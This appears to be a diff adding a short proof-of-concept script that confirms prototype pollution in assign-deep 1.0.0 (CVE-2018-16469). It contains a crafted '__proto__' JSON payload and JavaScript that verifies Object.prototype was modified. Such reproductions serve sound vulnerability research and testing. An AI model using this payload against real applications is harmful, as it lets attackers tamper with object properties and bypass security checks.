@@ -1,0 +1,21 @@
+Confirmed: `assign-deep@1.0.0` recursively merges object keys without filtering `__proto__`/`constructor`, so it's vulnerable to prototype pollution (CVE-2018-16469).
+
+```javascript
+const assign = require("assign-deep");
+
+// Trigger prototype pollution via a crafted "__proto__" key in the source object.
+const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
+
+assign({}, payload);
+
+// Any plain object now inherits the polluted property.
+const victim = {};
+console.log("polluted:", victim.polluted);
+
+if (victim.polluted === "yes") {
+  console.log("Prototype pollution successful: Object.prototype was modified");
+} else {
+  console.log("Exploit failed");
+  process.exit(1);
+}
+```
